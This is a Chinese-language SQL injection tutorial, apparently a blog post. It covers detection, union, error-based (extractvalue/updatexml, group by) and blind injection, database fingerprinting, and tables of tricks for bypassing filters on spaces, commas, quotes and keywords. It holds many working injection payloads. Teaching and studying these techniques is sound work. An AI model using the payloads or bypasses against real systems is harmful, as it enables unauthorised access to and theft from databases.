href=\"#3-4-特殊符号与注释\" class=\"headerlink\" title=\"3.4 特殊符号与注释\"></a>3.4 特殊符号与注释</h2><ol>\n<li>null 和 %00 是Access支持的注释。</li>\n<li># 是MySQL中的注释符，返回错误说明该注入点可能不是MySQL，另外也支持’– ‘,和&#x2F;* *&#x2F;注释（注意mysql使用– 时需要后面添加空格）</li>\n<li>– 和 &#x2F;* *&#x2F; 是Oracle，SQL server和MSSQL支持的注释符，如果正常，说明可能就是这仨了。</li>\n<li>; 是子句查询标识符，在Oracle中不支持多行查询，返回错误，很可能是Oracle数据库。</li>\n</ol>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-string\">&#x27; and exists (select count(*) from sysobjects) &gt;0 正常，就是MSSQL数据库</span><br><span class=\"hljs-string\">&#x27;</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">exists</span> (<span class=\"hljs-keyword\">select</span> <span class=\"hljs-built_in\">count</span>(<span class=\"hljs-operator\">*</span>) <span class=\"hljs-keyword\">from</span> msysobjects) <span class=\"hljs-operator\">&gt;</span><span class=\"hljs-number\">0</span> 两条都不正常，是Access数据库<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"4-绕过\"><a href=\"#4-绕过\" class=\"headerlink\" title=\"4 绕过\"></a>4 绕过</h1><h2 id=\"4-1-关键字过滤\"><a href=\"#4-1-关键字过滤\" class=\"headerlink\" title=\"4.1 关键字过滤\"></a>4.1 关键字过滤</h2><ul>\n<li>第一种是替换关键字，这种方式可以直接通过双写关键词等方式来进行绕过；</li>\n<li>第二种是关键词直接拦截，这种情况下可以通过变换函数等方式来进行绕过。</li>\n</ul>\n<h2 id=\"4-2-空格过滤\"><a href=\"#4-2-空格过滤\" class=\"headerlink\" title=\"4.2 空格过滤\"></a>4.2 空格过滤</h2><ul>\n<li>使用&#x2F;**&#x2F;即SQL语句中的注释语句来绕过。</li>\n<li>使用双写URL编码绕过，例如(%20 → %2%200)。</li>\n<li>通过特殊符号（反引号、加号、括号等等），绕过空格。（在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。）</li>\n<li>通过科学计数法绕过：where id&#x3D;0e1union select 1,2</li>\n<li>Fuzz所有字符，查找可替代空格的字符例如 %09 %0a %0b %0c %0d。</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>URL编码</th>\n<th>符号</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>%09</td>\n<td>TAB 键（水平）</td>\n</tr>\n<tr>\n<td>%0a</td>\n<td>新建一行</td>\n</tr>\n<tr>\n<td>%0c</td>\n<td>新的一页</td>\n</tr>\n<tr>\n<td>%0d</td>\n<td>return 功能</td>\n</tr>\n<tr>\n<td>%0b</td>\n<td>TAB 键（垂直）</td>\n</tr>\n<tr>\n<td>%a0</td>\n<td>空格</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th>数据库</th>\n<th>空白字符</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>SQLite3</td>\n<td>0A 0D 0C 09 20</td>\n</tr>\n<tr>\n<td>MYSQL5</td>\n<td>09 0A 0B 0C 0D A0 20</td>\n</tr>\n<tr>\n<td>PosgresSQL</td>\n<td>0A 0D 0C 09 20</td>\n</tr>\n<tr>\n<td>Oracle 11g</td>\n<td>00 0A 0D 0C 09 20</td>\n</tr>\n<tr>\n<td>MSSQL</td>\n<td>01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F 20</td>\n</tr>\n</tbody></table>\n<h2 id=\"4-3-逗号过滤-x2F-拦截\"><a href=\"#4-3-逗号过滤-x2F-拦截\" class=\"headerlink\" title=\"4.3 逗号过滤&#x2F;拦截\"></a>4.3 逗号过滤&#x2F;拦截</h2><p>拦截逗号后，意味着大部分的联合查询注入都失效，这个时候可以尝试进行盲注。</p>\n<p>substring和if语句都用到了逗号，因此无法使用。</p>\n<p>substring可以用substr()函数来进行代替，if语句可以通过and语句来进行代替。</p>\n<h2 id=\"4-4-单引号拦截-x2F-过滤-x2F-转义\"><a href=\"#4-4-单引号拦截-x2F-过滤-x2F-转义\" class=\"headerlink\" title=\"4.4 单引号拦截&#x2F;过滤&#x2F;转义\"></a>4.4 单引号拦截&#x2F;过滤&#x2F;转义</h2><p>当引号存在过滤和转义的情况下，可以这样处理：</p>\n<h3 id=\"4-4-1-利用编码特性绕过。（宽字节注入）\"><a href=\"#4-4-1-利用编码特性绕过。（宽字节注入）\" class=\"headerlink\" title=\"4.4.1 利用编码特性绕过。（宽字节注入）\"></a>4.4.1 利用编码特性绕过。（宽字节注入）</h3><p>比较典型的使用编码就是GBK编码：使用前面的字符吃掉后面的字符(斜杆)。</p>\n<p>待补充</p>\n<h3 id=\"4-4-2-利用反斜杠-绕过\"><a href=\"#4-4-2-利用反斜杠-绕过\" class=\"headerlink\" title=\"4.4.2 利用反斜杠\\绕过\"></a>4.4.2 利用反斜杠\\绕过</h3><p>待补充</p>\n<h3 id=\"4-4-3-将-utf-8-转换为-utf-16-或-utf-32\"><a href=\"#4-4-3-将-utf-8-转换为-utf-16-或-utf-32\" class=\"headerlink\" title=\"4.4.3 将 utf-8 转换为 utf-16 或 utf-32\"></a>4.4.3 将 utf-8 转换为 utf-16 或 utf-32</h3><p>待补充</p>\n<h2 id=\"4-5-数字被过滤-x2F-拦截绕过\"><a href=\"#4-5-数字被过滤-x2F-拦截绕过\" class=\"headerlink\" title=\"4.5 数字被过滤&#x2F;拦截绕过\"></a>4.5 数字被过滤&#x2F;拦截绕过</h2><p>数字被屏蔽时，用响应函数结果来构造。</p>\n<ul>\n<li>ceil() ：为向上取整函数</li>\n<li>floor()：为向下取整函数</li>\n<li>! ~~：起到取反的效果</li>\n<li>pi() ：π值</li>\n<li>version()：利用当前版本号进行数字的构造</li>\n<li>false：值为0</li>\n<li>true：值为1</li>\n</ul>\n<h2 id=\"4-6-等号过滤\"><a href=\"#4-6-等号过滤\" class=\"headerlink\" title=\"4.6 等号过滤\"></a>4.6 等号过滤</h2><ul>\n<li>当等于号&#x3D;呗过滤时，可以使用：like,in 等字符替换</li>\n</ul>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\">?id<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">&#x27; or &#x27;</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">&#x27; IN (&#x27;</span><span class=\"hljs-number\">1234</span><span class=\"hljs-string\">&#x27;)#</span><br><span class=\"hljs-string\">?id=1&#x27;</span> <span class=\"hljs-keyword\">or</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">like</span> <span class=\"hljs-number\">1</span>#<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"4-7-其他关键字过滤-x2F-拦截绕过\"><a href=\"#4-7-其他关键字过滤-x2F-拦截绕过\" class=\"headerlink\" title=\"4.7 其他关键字过滤&#x2F;拦截绕过\"></a>4.7 其他关键字过滤&#x2F;拦截绕过</h2><p>关键字被过滤时，可以通过双写或大小写、其他编码例如十六进制、URL编码来进行绕过：</p>\n<table>\n<thead>\n<tr>\n<th>关键字</th>\n<th>双写</th>\n<th>大小写</th>\n<th>其他编码</th>\n<th>符号</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>and</td>\n<td>aandnd</td>\n<td>and</td>\n<td>an\\x64</td>\n<td>&amp;&amp;</td>\n</tr>\n<tr>\n<td>select</td>\n<td>selselectect</td>\n<td>SelECt</td>\n<td>selec\\x74</td>\n<td></td>\n</tr>\n<tr>\n<td>or</td>\n<td>oorr</td>\n<td>oR</td>\n<td>o\\x72</td>\n<td>||</td>\n</tr>\n<tr>\n<td>union</td>\n<td>uniunionon</td>\n<td>uNioN</td>\n<td>unio\\x6e</td>\n<td></td>\n</tr>\n</tbody></table>\n<h1 id=\"参考内容\"><a href=\"#参考内容\" class=\"headerlink\" title=\"参考内容\"></a>参考内容</h1><p><a href=\"https://johnfrod.top/%e5%ae%89%e5%85%a8/sql%e6%b3%a8%e5%85%a5%e6%80%bb%e7%bb%93/\">sql注入总结</a></p>\n<p><a href=\"https://files.cnblogs.com/files/lcamry/mysql-injection.pdf\">注入天书</a></p>\n","site":{"data":{}},"wordcount":5213,"more":"<ul>\n<li><a href=\"#1-%E5%8E%9F%E7%90%86--%E7%B1%BB%E5%9E%8B\">1 原理 &amp; 类型</a><ul>\n<li><a href=\"#11-sql-%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86\">1.1 SQL 注入原理</a></li>\n<li><a href=\"#12-sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%B1%BB%E5%9E%8B%E6%8C%89%E6%8A%80%E5%B7%A7%E5%88%86%E7%B1%BB\">1.2 SQL注入的类型(按技巧分类)</a></li>\n</ul>\n</li>\n<li><a href=\"#2-%E6%A3%80%E6%B5%8B%E6%89%8B%E6%AE%B5\">2 检测手段</a><ul>\n<li><a href=\"#21-%E6%B3%A8%E5%85%A5%E7%82%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8--%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B\">2.1 注入点是否存在 &amp; 数据类型</a><ul>\n<li><a href=\"#211-%E6%B7%BB%E5%8A%A0%E5%8D%95%E5%BC%95%E5%8F%B7\">2.1.1 添加单引号</a></li>\n<li><a href=\"#212-%E6%B7%BB%E5%8A%A0%E8%BF%90%E7%AE%97%E7%AC%A6\">2.1.2 添加运算符</a></li>\n</ul>\n</li>\n<li><a href=\"#22-%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B\">2.2 注入类型</a><ul>\n<li><a href=\"#221-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5\">2.2.1 堆叠注入</a></li>\n<li><a href=\"#222-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5\">2.2.2 报错注入</a><ul>\n<li><a href=\"#2221-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5\">2.2.2.1 联合查询注入</a><ul>\n<li><a href=\"#%E8%A1%A8%E7%9A%84%E5%AD%97%E6%AE%B5%E6%95%B0%E9%87%8F%E5%88%A4%E6%96%AD\">表的字段数量判断</a></li>\n<li><a href=\"#%E6%98%BE%E7%A4%BA%E5%AD%97%E6%AE%B5%E5%86%85%E5%AE%B9%E5%88%A4%E6%96%AD\">显示字段内容判断</a></li>\n</ul>\n</li>\n<li><a href=\"#2222-group-by%E9%87%8D%E5%A4%8D%E5%BB%BA%E5%86%B2%E7%AA%81%E6%8A%A5%E9%94%99\">2.2.2.2 group by重复建冲突报错</a></li>\n<li><a href=\"#2223-xpath%E8%AF%AD%E6%B3%95%E9%94%99%E8%AF%AF\">2.2.2.3 xpath语法错误</a></li>\n</ul>\n</li>\n<li><a href=\"#223-%E7%9B%B2%E6%B3%A8\">2.2.3 盲注</a><ul>\n<li><a href=\"#2231-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8\">2.2.3.1 布尔盲注</a><ul>\n<li><a href=\"#%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6\">判断数据库名长度</a></li>\n<li><a href=\"#%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D\">判断数据库名</a></li>\n</ul>\n</li>\n<li><a href=\"#2232-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8\">2.2.3.2 时间盲注</a></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#3-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A4%E6%96%AD\">3 数据库判断</a><ul>\n<li><a href=\"#31-%E5%B8%B8%E8%A7%81%E5%89%8D%E7%AB%AF%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B%E5%8C%B9%E9%85%8D\">3.1 常见前端与数据库类型匹配</a></li>\n<li><a href=\"#32-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A0%87%E5%BF%97%E6%80%A7%E4%BF%A1%E6%81%AF\">3.2 数据库标志性信息</a></li>\n<li><a href=\"#33-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F\">3.3 字符串处理方式</a></li>\n<li><a href=\"#34-%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7%E4%B8%8E%E6%B3%A8%E9%87%8A\">3.4 特殊符号与注释</a></li>\n</ul>\n</li>\n<li><a href=\"#4-%E7%BB%95%E8%BF%87\">4 绕过</a><ul>\n<li><a href=\"#41-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4\">4.1 关键字过滤</a></li>\n<li><a href=\"#42-%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4\">4.2 空格过滤</a></li>\n<li><a href=\"#43-%E9%80%97%E5%8F%B7%E8%BF%87%E6%BB%A4%E6%8B%A6%E6%88%AA\">4.3 逗号过滤&#x2F;拦截</a></li>\n<li><a href=\"#44-%E5%8D%95%E5%BC%95%E5%8F%B7%E6%8B%A6%E6%88%AA%E8%BF%87%E6%BB%A4%E8%BD%AC%E4%B9%89\">4.4 单引号拦截&#x2F;过滤&#x2F;转义</a><ul>\n<li><a href=\"#441-%E5%88%A9%E7%94%A8%E7%BC%96%E7%A0%81%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5\">4.4.1 利用编码特性绕过。（宽字节注入）</a></li>\n<li><a href=\"#442-%E5%88%A9%E7%94%A8%E5%8F%8D%E6%96%9C%E6%9D%A0%E7%BB%95%E8%BF%87\">4.4.2 利用反斜杠\\绕过</a></li>\n<li><a href=\"#443-%E5%B0%86-utf-8-%E8%BD%AC%E6%8D%A2%E4%B8%BA-utf-16-%E6%88%96-utf-32\">4.4.3 将 utf-8 转换为 utf-16 或 utf-32</a></li>\n</ul>\n</li>\n<li><a href=\"#45-%E6%95%B0%E5%AD%97%E8%A2%AB%E8%BF%87%E6%BB%A4%E6%8B%A6%E6%88%AA%E7%BB%95%E8%BF%87\">4.5 数字被过滤&#x2F;拦截绕过</a></li>\n<li><a href=\"#46-%E7%AD%89%E5%8F%B7%E8%BF%87%E6%BB%A4\">4.6 等号过滤</a></li>\n<li><a href=\"#47-%E5%85%B6%E4%BB%96%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E6%8B%A6%E6%88%AA%E7%BB%95%E8%BF%87\">4.7 其他关键字过滤&#x2F;拦截绕过</a></li>\n</ul>\n</li>\n<li><a href=\"#%E5%8F%82%E8%80%83%E5%86%85%E5%AE%B9\">参考内容</a></li>\n</ul>\n<h1 id=\"1-原理-amp-类型\"><a href=\"#1-原理-amp-类型\" class=\"headerlink\" title=\"1 原理 &amp; 类型\"></a>1 原理 &amp; 类型</h1><h2 id=\"1-1-SQL-注入原理\"><a href=\"#1-1-SQL-注入原理\" class=\"headerlink\" title=\"1.1 SQL 注入原理\"></a>1.1 SQL 注入原理</h2><p>基本的SQL查询语句如下所示，其中 <code>$id</code> 为提交的变量，当这个参数没有做非常严格的过滤，通过对 <code>$id</code> 的构造，数据库能输出攻击者想要获取的内容，就造成了SQL注入的漏洞。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;$id&#x27;</span> LIMIT <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>Tips: <code>$id</code> 参数可能存在于任何参数传递的位置：</p>\n<ul>\n<li>GET&#x2F;POST&#x2F;PUT&#x2F;DELETE 参数</li>\n<li>X-Forwarded-For(详细内容待补充)</li>\n<li>查询、搜索</li>\n<li>页码、选择菜单</li>\n<li>账号、密码</li>\n<li>文件名</li>\n</ul>\n</blockquote>\n<h2 id=\"1-2-SQL注入的类型-按技巧分类\"><a href=\"#1-2-SQL注入的类型-按技巧分类\" class=\"headerlink\" title=\"1.2 SQL注入的类型(按技巧分类)\"></a>1.2 SQL注入的类型(按技巧分类)</h2><ul>\n<li>盲注<ul>\n<li>布尔盲注：只能从应用返回中推断语句执行后的布尔值</li>\n<li>时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断</li>\n</ul>\n</li>\n<li>报错注入：应用会显示全部或者部分的报错信息</li>\n<li>堆叠注入：有的应用可以加入 ; 后一次执行多条语句</li>\n<li>联合查询注入：</li>\n</ul>\n<h1 id=\"2-检测手段\"><a href=\"#2-检测手段\" class=\"headerlink\" title=\"2 检测手段\"></a>2 检测手段</h1><h2 id=\"2-1-注入点是否存在-amp-数据类型\"><a href=\"#2-1-注入点是否存在-amp-数据类型\" class=\"headerlink\" title=\"2.1 注入点是否存在 &amp; 数据类型\"></a>2.1 注入点是否存在 &amp; 数据类型</h2><h3 id=\"2-1-1-添加单引号\"><a href=\"#2-1-1-添加单引号\" class=\"headerlink\" title=\"2.1.1 添加单引号\"></a>2.1.1 添加单引号</h3><p>修改参数 <code>$id</code> 的值，在其中加入单引号，将SQL查询内容不闭合，如下所示，页面可能会显示部分或者全部数据库报错内容(如果没有被过滤)，则存在注入点，且注入类型为字符型。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;$id&#x27;&#x27; LIMIT 0,1</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-2-添加运算符\"><a href=\"#2-1-2-添加运算符\" class=\"headerlink\" title=\"2.1.2 添加运算符\"></a>2.1.2 添加运算符</h3><p>传入的参数并没有显示在报错信息中，则传入的参数前面可能没有引号包裹，于是注入的类型可能是数字型。可以通过在id后添加运算符，如-1，+2，来观察页面的内容是否会变成对应的 id 来判断是否存在注入点，此时注入类型为数字型。</p>\n<p>如下所示，将id变为1+1，+号在URL中会被编码为空格，所以我们需要提前将+号进行URL编码，变为：%2b</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;1+1&#x27;</span> LIMIT <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span>;<br><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;1%2b1&#x27;</span> LIMIT <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span>;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-2-注入类型\"><a href=\"#2-2-注入类型\" class=\"headerlink\" title=\"2.2 注入类型\"></a>2.2 注入类型</h2><h3 id=\"2-2-1-堆叠注入\"><a href=\"#2-2-1-堆叠注入\" class=\"headerlink\" title=\"2.2.1 堆叠注入\"></a>2.2.1 堆叠注入</h3><p>分号 <code>;</code> 在sql中意味着一条语句的结束，可以在分号后继续构造第二条语句，数据库依然会继续执行，这样就会存在堆叠注入。</p>\n<blockquote>\n<p>Tips: 堆叠注入存在局限性</p>\n<ol>\n<li>结果不会在页面显示</li>\n<li>接口或者数据库引擎不支持</li>\n</ol>\n</blockquote>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;1&#x27;</span>;<span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-number\">1</span>,database(),version(),<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">5</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-2-2-报错注入\"><a href=\"#2-2-2-报错注入\" class=\"headerlink\" title=\"2.2.2 报错注入\"></a>2.2.2 报错注入</h3><h4 id=\"2-2-2-1-联合查询注入\"><a href=\"#2-2-2-1-联合查询注入\" class=\"headerlink\" title=\"2.2.2.1 联合查询注入\"></a>2.2.2.1 联合查询注入</h4><h5 id=\"表的字段数量判断\"><a href=\"#表的字段数量判断\" class=\"headerlink\" title=\"表的字段数量判断\"></a>表的字段数量判断</h5><p>在mysql、mariadb、oracle等数据库中，可以使用数字来代替对应字段(列)的名称，如果数据库中没有对应的字段(列)，就会报错。使用 order by 让 <code>$id</code> 按照不同的字段排序，直到 order by 后的数字超出了字段数量，则会返回报错信息。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;1&#x27;</span> <span class=\"hljs-keyword\">order</span> <span class=\"hljs-keyword\">by</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-comment\">--+ LIMIT 0,1;</span><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"显示字段内容判断\"><a href=\"#显示字段内容判断\" class=\"headerlink\" title=\"显示字段内容判断\"></a>显示字段内容判断</h5><p>union 联合查询时，当前面的语句为假，则后面的查询结果会显示到相应的位置。则可以通过在前面查询语句中添加 and 1&#x3D;2 使语句变假，来判断页面显示的内容为表中的哪几个字段。然后使用database()和version()替换相应的字段位置就可以查询数据库名称和版本号。 </p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;-1&#x27;</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">5</span> <span class=\"hljs-comment\">--+ LIMIT 0,1;</span><br><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;1&#x27;</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span><span class=\"hljs-operator\">=</span><span class=\"hljs-number\">2</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">5</span> <span class=\"hljs-comment\">--+ LIMIT 0,1;</span><br><br><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;-1&#x27;</span> <span class=\"hljs-keyword\">UNION</span> <span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-number\">1</span>,database(),version(),<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">5</span> <span class=\"hljs-comment\">--+</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"2-2-2-2-group-by重复建冲突报错\"><a href=\"#2-2-2-2-group-by重复建冲突报错\" class=\"headerlink\" title=\"2.2.2.2 group by重复建冲突报错\"></a>2.2.2.2 group by重复建冲突报错</h4><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;2&#x27;</span> <span class=\"hljs-keyword\">and</span> (<br>    <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">from</span> (<br>        <span class=\"hljs-keyword\">select</span> <span class=\"hljs-built_in\">count</span>(<span class=\"hljs-operator\">*</span>),concat(<br>            (<br>                <span class=\"hljs-keyword\">select</span> database() <span class=\"hljs-keyword\">from</span> information_schema.tables limit <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span>  <span class=\"hljs-comment\">--+ 真正的查询语句</span><br>            ),<span class=\"hljs-built_in\">floor</span>(rand()<span class=\"hljs-operator\">*</span><span class=\"hljs-number\">2</span>)<br>        )x <span class=\"hljs-keyword\">from</span> information_schema.tables <span class=\"hljs-keyword\">group</span> <span class=\"hljs-keyword\">by</span> x<br>    )a<br>) <span class=\"hljs-comment\">--+</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"2-2-2-3-xpath语法错误\"><a href=\"#2-2-2-3-xpath语法错误\" class=\"headerlink\" title=\"2.2.2.3 xpath语法错误\"></a>2.2.2.3 xpath语法错误</h4><p>xpath 语法报错注入，主要利用extractvalue()和updatexml()函数。  </p>\n<p>使用方法：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;2&#x27;</span> <span class=\"hljs-keyword\">and</span> extractvalue(<span class=\"hljs-number\">1</span>,concat(<span class=\"hljs-string\">&#x27;^&#x27;</span>,(<br>    <span class=\"hljs-keyword\">select</span> database()  <span class=\"hljs-comment\">--+ 真正的查询语句</span><br>    ),<span class=\"hljs-string\">&#x27;^&#x27;</span>)) <span class=\"hljs-comment\">--+</span><br><br><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;2&#x27;</span> <span class=\"hljs-keyword\">and</span> updatexml(<span class=\"hljs-number\">1</span>,concat(<span class=\"hljs-string\">&#x27;^&#x27;</span>,(<br>    <span class=\"hljs-keyword\">select</span> database()  <span class=\"hljs-comment\">--+ 真正的查询语句</span><br>    ),<span class=\"hljs-string\">&#x27;^&#x27;</span>),<span class=\"hljs-number\">1</span>) <span class=\"hljs-comment\">--+</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-2-3-盲注\"><a href=\"#2-2-3-盲注\" class=\"headerlink\" title=\"2.2.3 盲注\"></a>2.2.3 盲注</h3><h4 id=\"2-2-3-1-布尔盲注\"><a href=\"#2-2-3-1-布尔盲注\" class=\"headerlink\" title=\"2.2.3.1 布尔盲注\"></a>2.2.3.1 布尔盲注</h4><h5 id=\"判断数据库名长度\"><a href=\"#判断数据库名长度\" class=\"headerlink\" title=\"判断数据库名长度\"></a>判断数据库名长度</h5><p>改变length(database())&#x3D;的数值，当条件为真时，页面就会正常显示</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;2&#x27;</span> <span class=\"hljs-keyword\">and</span> length(database())<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span> <span 